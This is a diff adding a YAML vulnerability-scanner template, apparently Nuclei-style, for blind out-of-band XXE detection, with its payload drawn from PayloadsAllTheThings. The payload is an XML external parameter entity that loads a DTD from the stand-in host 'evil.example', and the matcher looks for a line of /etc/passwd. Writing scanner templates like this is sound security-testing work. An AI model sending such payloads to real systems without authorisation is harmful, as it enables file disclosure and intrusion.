@@ -1,0 +1,20 @@
+id: patt-xxe-oob-01-data
+name: 'PATT xxe patt-xxe-oob-01 via data'
+severity: critical
+type: active
+tags:
+  - xxe
+  - patt
+  - oob
+description: 'PATT blind OOB via parameter entity (must Collaborator, do not claim without callback). [patt:patt-xxe-oob-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XXE%20Injection/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      data:
+        - '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % a SYSTEM "http://evil.example/x.dtd"> %a;]>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
